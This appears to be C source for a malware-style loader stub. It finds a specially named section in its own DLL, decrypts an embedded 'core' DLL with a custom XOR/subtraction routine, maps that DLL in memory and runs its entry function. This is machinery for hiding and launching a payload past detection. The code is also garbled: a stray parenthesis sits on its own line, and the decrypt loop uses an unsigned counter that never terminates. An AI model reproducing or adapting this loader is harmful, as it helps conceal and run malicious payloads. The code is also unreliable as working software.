#include "STUBHandler.h"
#include "MemorySections.h"

#include "config.h"
#include "define.h"

void 
Core_Load
(void)
{
	INT32 nCoreLen;
	LPVOID lpCore;
	HMODULE hCoreModule;
	TCoreHeader *h;

	if(!Core_GetDLL(&lpCore, &nCoreLen))
		return;
	
	h = (TCoreHeader *)lpCore;
	
	Core_Crypt((BYTE *)((DWORD)lpCore + h->HeaderLength), h->SectionLength);

	if(Setup(NULL, (LPVOID)((DWORD)lpCore + h->HeaderLength), h->SectionLength, &hCoreModule))
		return;
	
#	define DLL_FUNC(p, a, b)	{ if(p) ((__tLibraryExecEntry)p)(a, b); }
	DLL_FUNC(GetProcAddress(hCoreModule, ENTRY_FUNC), lpCore, nCoreLen);
	
	FreeLibrary(hCoreModule);
}

void 
Core_Crypt
(BYTE *lpStream,
 DWORD dwLength)
{
	DWORD i = 4, k, j, l;
	
	for(; i >= 0; i--)
	{
		for(k = 0; k < dwLength; k++)
			lpStream[k] ^= X_CORE_KEY * k;
		
		for(j = 0; j < dwLength / 2; j++)
			lpStream[j] ^= lpStream[((dwLength + 1) / 2) + j];
		
		for(l = dwLength - 1; l >= 1; l--)
			lpStream[l] -= lpStream[l - 1];
	}
}

extern HINSTANCE g_hInstDLL;

BOOL
Core_GetDLL
(LPVOID *ppCore,
 INT32 *pCoreLen)
{
	PIMAGE_NT_HEADERS pImageNT;
	PIMAGE_SECTION_HEADER pImageSection;
	INT32 i;
	DWORD nCoreLen;
	LPVOID lpCore;
	
	if(((PIMAGE_DOS_HEADER)g_hInstDLL)->e_magic != MZ_HEADER)
		return FALSE;
	
	pImageNT = IMAGE_NT(g_hInstDLL);
	
	if(pImageNT->Signature != PE_HEADER)
		return FALSE;

	pImageSection = SECTION_TABLE(pImageNT);
	i = 0;
	
	if(pImageNT->FileHeader.NumberOfSections <= 0)
		return FALSE;
	
	while(lstrcmpiA((LPCSTR)pImageSection->Name, X_SECTION_NAME))
	{
		++i; ++pImageSection;
		
		if(i >= pImageNT->FileHeader.NumberOfSections)
		{
			DEBUG_P("[-] The core section has not been found")
			return FALSE;
		}
	}
	
	nCoreLen = pImageSection->SizeOfRawData;
	)
	if(nCoreLen < sizeof(TCoreHeader) + sizeof(DWORD))
	{
		DEBUG_P("The core is too small.")
		return FALSE;
	}
	
	lpCore = (LPVOID)(g_hInstDLL + pImageSection->VirtualAddress);
	
	if(*(DWORD *)lpCore != X_SIGNATURE)
	{
		DEBUG_P("The core has an invalid signature.")
		return FALSE;
	}
	
	*ppCore		= (LPVOID)((DWORD)lpCore + sizeof(DWORD));
	*pCoreLen	= nCoreLen - sizeof(DWORD);
	
	return TRUE;
}